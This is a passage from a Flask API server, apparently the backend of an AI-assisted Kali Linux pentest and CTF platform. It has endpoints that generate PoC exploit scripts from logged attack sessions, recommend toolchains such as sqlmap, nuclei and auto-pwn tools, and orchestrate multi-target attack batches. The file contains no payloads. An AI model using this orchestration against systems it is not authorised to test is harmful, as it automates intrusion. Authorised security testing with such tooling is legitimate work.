        logger.error(f"Error getting attack session: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/poc/generate", methods=["POST"])
def generate_poc():
    """从攻击会话生成PoC"""
    try:
        if 'poc_generator' not in globals() or poc_generator is None:
            return jsonify({"error": "PoC generator not initialized"}), 500

        if 'attack_logger' not in globals() or attack_logger is None:
            return jsonify({"error": "Attack logger not initialized"}), 500

        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        session_id = data.get("session_id")
        if not session_id:
            return jsonify({"error": "session_id is required"}), 400

        # 获取会话数据
        session_data = attack_logger.session_logs.get(session_id)
        if not session_data:
            return jsonify({"error": "Session not found"}), 404

        # 生成PoC
        pocs = poc_generator.generate_poc_from_session(session_data)

        if "error" in pocs:
            return jsonify({"error": pocs["error"]}), 400

        return jsonify({
            "success": True,
            "session_id": session_id,
            "generated_pocs": {
                "python": "python" in pocs,
                "bash": "bash" in pocs,
                "ctf_solver": "ctf_solver" in pocs,
                "markdown": "markdown" in pocs
            },
            "poc_files_saved": True,
            "pocs": pocs,
            "message": f"成功生成 {len(pocs)} 种格式的PoC"
        })

    except Exception as e:
        logger.error(f"Error generating PoC: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/poc/generate-from-current", methods=["POST"])
def generate_poc_from_current():
    """从当前活跃会话生成PoC"""
    try:
        if 'poc_generator' not in globals() or poc_generator is None:
            return jsonify({"error": "PoC generator not initialized"}), 500

        if 'attack_logger' not in globals() or attack_logger is None:
            return jsonify({"error": "Attack logger not initialized"}), 500

        if not attack_logger.current_session:
            return jsonify({"error": "No active attack session"}), 400

        # 获取当前会话数据
        session_data = attack_logger.session_logs.get(attack_logger.current_session)
        if not session_data:
            return jsonify({"error": "Current session not found"}), 404

        # 生成PoC
        pocs = poc_generator.generate_poc_from_session(session_data)

        if "error" in pocs:
            return jsonify({"error": pocs["error"]}), 400

        return jsonify({
            "success": True,
            "session_id": attack_logger.current_session,
            "generated_pocs": {
                "python": "python" in pocs,
                "bash": "bash" in pocs,
                "ctf_solver": "ctf_solver" in pocs,
                "markdown": "markdown" in pocs
            },
            "poc_files_saved": True,
            "pocs": pocs,
            "message": f"从当前会话成功生成 {len(pocs)} 种格式的PoC"
        })

    except Exception as e:
        logger.error(f"Error generating PoC from current session: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/poc/list-templates", methods=["GET"])
def list_poc_templates():
    """获取可用的PoC模板"""
    try:
        if 'poc_generator' not in globals() or poc_generator is None:
            return jsonify({"error": "PoC generator not initialized"}), 500

        templates = list(poc_generator.templates.keys())

        template_info = {
            "python_web": "Python Web应用漏洞利用脚本",
            "bash_network": "Bash网络渗透测试脚本",
            "ctf_solver": "CTF挑战解题脚本",
            "markdown_report": "Markdown格式的详细报告"
        }

        return jsonify({
            "success": True,
            "available_templates": templates,
            "template_descriptions": template_info,
            "total_templates": len(templates)
        })

    except Exception as e:
        logger.error(f"Error listing PoC templates: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

@app.route("/api/attack/sessions", methods=["GET"])
def list_attack_sessions():
    """获取所有攻击会话列表"""
    try:
        if 'attack_logger' not in globals() or attack_logger is None:
            return jsonify({"error": "Attack logger not initialized"}), 500

        sessions = []
        for session_id, session_data in attack_logger.session_logs.items():
            session_summary = {
                "session_id": session_id,
                "session_name": session_data.get("session_name", ""),
                "target": session_data.get("target", ""),
                "mode": session_data.get("mode", ""),
                "start_time": session_data.get("start_time", "").isoformat() if hasattr(session_data.get("start_time"), 'isoformat') else str(session_data.get("start_time", "")),
                "total_steps": len(session_data.get("attack_steps", [])),
                "flags_found": len(session_data.get("flags_found", [])),
                "compromise_level": session_data.get("compromise_level", "none"),
                "is_active": session_id == attack_logger.current_session
            }

            if "end_time" in session_data:
                session_summary["duration"] = session_data.get("duration", 0)

            sessions.append(session_summary)

        return jsonify({
            "success": True,
            "sessions": sessions,
            "total_sessions": len(sessions),
            "active_session": attack_logger.current_session
        })

    except Exception as e:
        logger.error(f"Error listing attack sessions: {str(e)}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

# ==================== AI上下文管理API支持 ====================

# 全局会话存储和策略管理
ai_sessions = {}
global_knowledge_base = {
    "session_discoveries": {},
    "strategy_effectiveness": {},
    "attack_patterns": {},
    "successful_payloads": {}
}

@app.route("/api/ai/session/create", methods=["POST"])
def ai_create_session():
    """创建AI上下文会话"""
    try:
        data = request.json
        target = data.get("target", "")
        attack_mode = data.get("attack_mode", "pentest")
        session_name = data.get("session_name", "")

        session_id = f"ai_{int(time.time())}_{random.randint(1000, 9999)}"

        session_data = {
            "session_id": session_id,
            "target": target,
            "attack_mode": attack_mode,
            "session_name": session_name,
            "start_time": time.time(),
            "conversation_history": [],
            "discovered_assets": {},
            "completed_tasks": [],
            "current_strategy": None,
            "context_metadata": {},
            "last_interaction": time.time()
        }

        ai_sessions[session_id] = session_data
        logger.info(f"Created AI session {session_id} for target {target}")

        return jsonify({
            "success": True,
            "session_id": session_id,
            "session_data": session_data,
            "message": f"AI会话已创建: {session_id}"
        })

    except Exception as e:
        logger.error(f"AI session creation error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/ai/session/<session_id>", methods=["GET"])
def ai_get_session(session_id):
    """获取AI会话信息"""
    try:
        if session_id not in ai_sessions:
            return jsonify({"success": False, "error": "Session not found"}), 404

        session = ai_sessions[session_id]
        session["last_interaction"] = time.time()

        return jsonify({
            "success": True,
            "session_data": session,
            "duration": time.time() - session["start_time"]
        })

    except Exception as e:
        logger.error(f"AI session retrieval error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/ai/session/<session_id>/update", methods=["POST"])
def ai_update_session(session_id):
    """更新AI会话上下文"""
    try:
        if session_id not in ai_sessions:
            return jsonify({"success": False, "error": "Session not found"}), 404

        data = request.json
        session = ai_sessions[session_id]

        # 更新发现的资产
        discovered_info = data.get("discovered_info", {})
        for key, value in discovered_info.items():
            if key in session["discovered_assets"]:
                if isinstance(session["discovered_assets"][key], list):
                    session["discovered_assets"][key].extend(value if isinstance(value, list) else [value])
                else:
                    session["discovered_assets"][key] = value
            else:
                session["discovered_assets"][key] = value

        # 添加对话历史
        if data.get("user_message"):
            conversation = {
                "timestamp": time.time(),
                "user_message": data["user_message"],
                "ai_response": data.get("ai_response", ""),
                "tools_used": data.get("tools_used", []),
                "session_context": {
                    "target": session["target"],
                    "strategy": session["current_strategy"],
                    "discovered_assets": len(session["discovered_assets"])
                }
            }
            session["conversation_history"].append(conversation)

        # 更新完成的任务
        if data.get("completed_task"):
            session["completed_tasks"].append(data["completed_task"])

        # 更新当前策略
        if data.get("current_strategy"):
            session["current_strategy"] = data["current_strategy"]

        session["last_interaction"] = time.time()

        return jsonify({
            "success": True,
            "session_data": session,
            "message": "Session updated successfully"
        })

    except Exception as e:
        logger.error(f"AI session update error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/ai/sessions", methods=["GET"])
def ai_list_sessions():
    """列出所有AI会话"""
    try:
        sessions_summary = []
        for session_id, session in ai_sessions.items():
            sessions_summary.append({
                "session_id": session_id,
                "target": session["target"],
                "attack_mode": session["attack_mode"],
                "session_name": session.get("session_name", ""),
                "start_time": session["start_time"],
                "duration": time.time() - session["start_time"],
                "conversation_count": len(session["conversation_history"]),
                "assets_discovered": len(session["discovered_assets"]),
                "tasks_completed": len(session["completed_tasks"]),
                "current_strategy": session["current_strategy"],
                "last_interaction": session["last_interaction"]
            })

        return jsonify({
            "success": True,
            "total_sessions": len(sessions_summary),
            "active_sessions": len([s for s in sessions_summary if time.time() - s["last_interaction"] < 3600]),
            "sessions": sessions_summary
        })

    except Exception as e:
        logger.error(f"AI sessions list error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/ai/intent/analyze", methods=["POST"])
def ai_analyze_intent():
    """AI意图分析API"""
    try:
        data = request.json
        user_message = data.get("user_message", "")
        session_id = data.get("session_id", "")

        # 基础意图分析
        intent_analysis = {
            "primary_intent": "unknown",
            "target_extraction": "",
            "urgency_level": "normal",
            "context_switches": [],
            "tool_suggestions": []
        }

        message_lower = user_message.lower()

        # 意图分析
        if any(word in message_lower for word in ["扫描", "scan", "测试", "test"]):
            intent_analysis["primary_intent"] = "security_testing"
        elif any(word in message_lower for word in ["ctf", "解题", "flag", "challenge"]):
            intent_analysis["primary_intent"] = "ctf_solving"
        elif any(word in message_lower for word in ["分析", "analyze", "逆向", "reverse"]):
            intent_analysis["primary_intent"] = "analysis"
        elif any(word in message_lower for word in ["攻击", "exploit", "利用", "pwn"]):
            intent_analysis["primary_intent"] = "exploitation"

        # 目标提取
        import re
        # URL提取
        url_pattern = r'https?://[^\s]+'
        urls = re.findall(url_pattern, user_message)
        if urls:
            intent_analysis["target_extraction"] = urls[0]

        # IP地址提取
        ip_pattern = r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
        ips = re.findall(ip_pattern, user_message)
        if ips:
            intent_analysis["target_extraction"] = ips[0]

        # 紧急程度
        if any(word in message_lower for word in ["紧急", "urgent", "快速", "fast", "马上"]):
            intent_analysis["urgency_level"] = "high"
        elif any(word in message_lower for word in ["详细", "comprehensive", "深入", "thorough"]):
            intent_analysis["urgency_level"] = "low"

        return jsonify({
            "success": True,
            "intent_analysis": intent_analysis,
            "processed_message": user_message,
            "session_id": session_id
        })

    except Exception as e:
        logger.error(f"AI intent analysis error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/ai/strategy/recommend", methods=["POST"])
def ai_recommend_strategy():
    """AI策略推荐API"""
    try:
        data = request.json
        session_id = data.get("session_id", "")
        user_context = data.get("user_context", "")
        target = data.get("target", "")

        # 预定义策略
        strategies = {
            "web_comprehensive": {
                "description": "全面Web应用安全测试",
                "tools": ["nmap_scan", "gobuster_scan", "sqlmap_scan", "nuclei_web_scan", "nikto_scan"],
                "conditions": ["web_service_detected", "http_ports_open"],
                "complexity": "high",
                "estimated_time": "30-60 minutes"
            },
            "ctf_quick_solve": {
                "description": "CTF快速解题策略",
                "tools": ["ctf_quick_scan", "ctf_web_attack", "get_detected_flags"],
                "conditions": ["ctf_mode", "time_limited"],
                "complexity": "medium",
                "estimated_time": "5-15 minutes"
            },
            "network_recon": {
                "description": "网络侦察和服务发现",
                "tools": ["nmap_scan", "masscan_scan", "nuclei_network_scan"],
                "conditions": ["ip_target", "network_range"],
                "complexity": "medium",
                "estimated_time": "15-30 minutes"
            },
            "pwn_exploitation": {
                "description": "二进制漏洞利用",
                "tools": ["pwnpasi_auto_pwn", "auto_reverse_analyze", "quick_pwn_check"],
                "conditions": ["binary_file", "pwn_challenge"],
                "complexity": "high",
                "estimated_time": "20-45 minutes"
            }
        }

        # 分析上下文并推荐策略
        recommended_strategies = []
        confidence_scores = {}

        combined_context = f"{user_context} {target}".lower()

        # Web应用指标
        if any(indicator in combined_context for indicator in ["http", "www", ".com", ".org", "web"]):
            confidence_scores["web_comprehensive"] = 0.8

        # CTF指标
        if any(indicator in combined_context for indicator in ["ctf", "flag", "challenge", "解题"]):
            confidence_scores["ctf_quick_solve"] = 0.9

        # 二进制文件指标
        if any(indicator in combined_context for indicator in [".exe", "binary", "pwn", "二进制"]):
            confidence_scores["pwn_exploitation"] = 0.8

        # IP地址或网络指标
        import re
        ip_pattern = r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
        if re.search(ip_pattern, combined_context):
            confidence_scores["network_recon"] = 0.7

        # 基于置信度排序策略
        sorted_strategies = sorted(confidence_scores.items(), key=lambda x: x[1], reverse=True)

        for strategy, confidence in sorted_strategies[:3]:
            recommended_strategies.append({
                "strategy": strategy,
                "confidence": confidence,
                "details": strategies.get(strategy, {})
            })

        return jsonify({
            "success": True,
            "recommended_strategies": recommended_strategies,
            "session_id": session_id,
            "context_analyzed": combined_context
        })

    except Exception as e:
        logger.error(f"AI strategy recommendation error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/ai/knowledge/update", methods=["POST"])
def ai_update_knowledge():
    """更新AI知识库"""
    try:
        data = request.json
        category = data.get("category", "")
        key = data.get("key", "")
        value = data.get("value", "")

        if not category or not key:
            return jsonify({"success": False, "error": "Category and key are required"}), 400

        if category not in global_knowledge_base:
            global_knowledge_base[category] = {}

        global_knowledge_base[category][key] = value

        return jsonify({
            "success": True,
            "category": category,
            "key": key,
            "message": "Knowledge base updated"
        })

    except Exception as e:
        logger.error(f"AI knowledge update error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/ai/knowledge/<category>", methods=["GET"])
def ai_get_knowledge(category):
    """获取AI知识库内容"""
    try:
        if category not in global_knowledge_base:
            return jsonify({"success": False, "error": "Category not found"}), 404

        return jsonify({
            "success": True,
            "category": category,
            "knowledge": global_knowledge_base[category],
            "total_entries": len(global_knowledge_base[category])
        })

    except Exception as e:
        logger.error(f"AI knowledge retrieval error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

@app.route("/api/ai/stats", methods=["GET"])
def ai_get_stats():
    """获取AI系统统计信息"""
    try:
        current_time = time.time()
        active_sessions = [s for s in ai_sessions.values() if current_time - s["last_interaction"] < 3600]

        stats = {
            "total_sessions": len(ai_sessions),
            "active_sessions": len(active_sessions),
            "total_conversations": sum(len(s["conversation_history"]) for s in ai_sessions.values()),
            "knowledge_base_size": {
                category: len(data) for category, data in global_knowledge_base.items()
            },
            "session_modes": {},
            "average_session_duration": 0
        }

        # 统计会话模式分布
        for session in ai_sessions.values():
            mode = session.get("attack_mode", "unknown")
            stats["session_modes"][mode] = stats["session_modes"].get(mode, 0) + 1

        # 计算平均会话时长
        if ai_sessions:
            total_duration = sum(current_time - s["start_time"] for s in ai_sessions.values())
            stats["average_session_duration"] = total_duration / len(ai_sessions)

        return jsonify({
            "success": True,
            "stats": stats,
            "timestamp": current_time
        })

    except Exception as e:
        logger.error(f"AI stats error: {e}")
        return jsonify({"success": False, "error": str(e)}), 500

def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="Run the Kali Linux API Server")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    parser.add_argument("--port", type=int, default=API_PORT, help=f"Port for the API server (default: {API_PORT})")
    return parser.parse_args()

# ==================== 多目标协调API端点 ====================

@app.route("/api/multi-target/add-target", methods=["POST"])
def api_multi_target_add_target():
    """添加新目标到多目标协调系统"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No JSON data provided"}), 400

        target_url = data.get("target_url")
        if not target_url:
            return jsonify({"error": "target_url is required"}), 400

        target_type = data.get("target_type", "unknown")
        priority = data.get("priority", 1)
        dependencies = data.get("dependencies", [])

        # 简化实现 - 创建目标ID
        target_id = f"target_{int(time.time())}_{random.randint(1000, 9999)}"

        return jsonify({
            "success": True,
            "target_id": target_id,
            "target_url": target_url,
            "target_type": target_type,
            "priority": priority,
            "dependencies": dependencies,
            "message": f"目标 {target_url} 已添加到协调系统"
        })

    except Exception as e:
        logger.error(f"Error adding target: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route("/api/multi-target/orchestrate", methods=["POST"])
def api_multi_target_orchestrate():
    """执行多目标攻击编排"""
    try:
        data = request.get_json()
        strategy = data.get("strategy", "adaptive") if data else "adaptive"

        # 模拟编排计划
        orchestration_plan = {
            "orchestration_strategy": strategy,
            "execution_plan": {
                "strategy": strategy,
                "execution_phases": [
                    {
                        "phase": 1,
                        "execution_mode": "adaptive",
                        "target_count": 1,
                        "tasks": []
                    }
                ]
            },
            "targets_count": 0,
            "tasks_count": 0,
            "estimated_total_time": 0
        }

        return jsonify({
            "success": True,
            "orchestration_plan": orchestration_plan,
            "message": f"使用 {strategy} 策略生成执行计划"
        })

    except Exception as e:
        logger.error(f"Error orchestrating attack: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route("/api/multi-target/status", methods=["GET"])
def api_multi_target_get_status():
    """获取多目标协调系统状态"""
    try:
        status = {
            "total_targets": 0,
            "active_targets": 0,
            "completed_targets": 0,
            "total_tasks": 0,
            "queued_tasks": 0,
            "running_tasks": 0,
            "completed_tasks": 0,
            "failed_tasks": 0,
            "success_rate": 0,
            "current_strategy": "adaptive",
            "resource_utilization": 0,
            "performance_metrics": {
                "total_targets": 0,
                "completed_targets": 0,
                "failed_targets": 0,
                "average_completion_time": 0,
                "success_rate": 0,
                "resource_utilization": 0
            }
        }

        return jsonify({
            "success": True,
            "status": status,
            "message": "系统状态获取成功"
        })

    except Exception as e:
        logger.error(f"Error getting status: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route("/api/multi-target/execute-batch", methods=["POST"])
def api_multi_target_execute_batch():
    """批量执行多目标攻击任务"""
    try:
        data = request.get_json()
        target_ids = data.get("target_ids", []) if data else []
        max_concurrent = data.get("max_concurrent", 3) if data else 3

        execution_summary = {
            "total_targets": len(target_ids),
            "execution_strategy": "adaptive",
            "estimated_time": 0,
            "phases": 0,
            "concurrent_limit": max_concurrent
        }

        orchestration_plan = {
            "orchestration_strategy": "adaptive",
            "execution_plan": {
                "execution_phases": []
            }
        }

        return jsonify({
            "success": True,
            "execution_summary": execution_summary,
            "orchestration_plan": orchestration_plan,
            "message": f"批量执行已启动，涉及 {len(target_ids)} 个目标"
        })

    except Exception as e:
        logger.error(f"Error executing batch: {str(e)}")
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    args = parse_args()
    
    # Set configuration from command line arguments
    if args.debug:
        DEBUG_MODE = True
        os.environ["DEBUG_MODE"] = "1"
        logger.setLevel(logging.DEBUG)
    
    if args.port != API_PORT:
        API_PORT = args.port
    
    # 初始化并发任务管理器
    task_manager = ConcurrentTaskManager(max_workers=10)
    logger.info("Concurrent Task Manager started")

    # 初始化智能分析模块
    parameter_optimizer = IntelligentParameterOptimizer()
    correlation_engine = ResultCorrelationEngine()
    adaptive_strategy = AdaptiveScanStrategy()
    payload_generator = IntelligentPayloadGenerator()

    # 初始化PoC生成系统
    poc_generator = PoCGenerator()
    attack_logger = AttackLogger()
    logger.info("PoC generation and attack logging systems initialized")

    # 初始化WebSocket连接管理器
    websocket_manager = WebSocketConnectionManager()
    websocket_manager.start_background_monitor()
    logger.info("WebSocket connection manager started")

    logger.info("Intelligent analysis modules initialized")

    # 初始化全局结果存储，用于自动关联
    scan_results_cache = {}

    logger.info(f"Starting Kali Linux Tools API Server with WebSocket support on port {API_PORT}")
    try:
        # 使用SocketIO运行，支持WebSocket长连接
        socketio.run(app, host="0.0.0.0", port=API_PORT, debug=DEBUG_MODE)
    except KeyboardInterrupt:
        logger.info("Received shutdown signal, stopping WebSocket manager...")
        if websocket_manager:
            websocket_manager.stop_background_monitor()
        logger.info("Server shutdown complete")
    except Exception as e:
        logger.error(f"Server startup failed: {str(e)}")
        if websocket_manager:
            websocket_manager.stop_background_monitor()
        raise
